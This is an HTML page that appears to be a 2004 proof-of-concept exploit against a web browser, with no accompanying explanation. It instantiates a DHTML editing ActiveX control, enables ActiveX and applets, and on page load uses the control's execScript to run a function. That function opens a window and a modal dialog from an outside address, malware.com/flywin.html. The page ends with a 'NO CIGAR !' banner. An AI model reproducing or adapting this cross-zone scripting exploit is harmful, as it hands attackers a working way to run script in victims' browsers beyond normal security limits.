< body onload="setTimeout(' main() ',1000)">
< object
 id="x"
 classid="clsid:2D360201-FFF5-11d1-8D03-00A0C959BC0A"
 width="1"
 height="1"
 align="middle"
>
< PARAM NAME="ActivateApplets" VALUE="1">
< PARAM NAME="ActivateActiveXControls" VALUE="1">
</object>

< SCRIPT>

// 10.11.04 http://www.editive.com

function shellscript()
{
 open("http://www.malware.com/flywin.html","_blank","scrollbar=no");
 showModalDialog("http://www.malware.com/flywin.html");
 }

function main()
{
 x.DOM.Script.execScript(shellscript.toString());
 x.DOM.Script.setTimeout("shellscript()");
}
</SCRIPT>
<br><br><br><br><br><br><center><img src=nocigar.gif><br><br><FONT FACE=ARIAL SIZE 12PT>NO CIGAR !</FONT></center>
